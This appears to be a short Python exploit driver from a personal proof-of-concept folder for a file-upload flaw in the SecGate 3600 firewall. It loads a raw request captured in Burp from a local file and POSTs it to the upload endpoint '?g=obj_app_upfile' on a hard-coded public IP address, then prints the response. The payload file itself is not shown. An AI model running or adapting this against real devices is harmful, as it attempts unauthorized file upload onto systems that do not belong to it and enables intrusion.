import requests

# 读取请求包文件
with open(r'D:\C#\VSCODE\python\POC_EXP\文件上传\网神_SecGate_3600\burp.txt', 'r') as file:
    request_data = file.read()

# url = 'http://example.com'  # 替换为您的目标 URL
url='http://59.58.177.170:8090/?g=obj_app_upfile'

# 发送请求包
res = requests.request('POST', url, data=request_data)

# 打印响应内容
print(f'{res} {len(res.text)}')

# print(response.text)
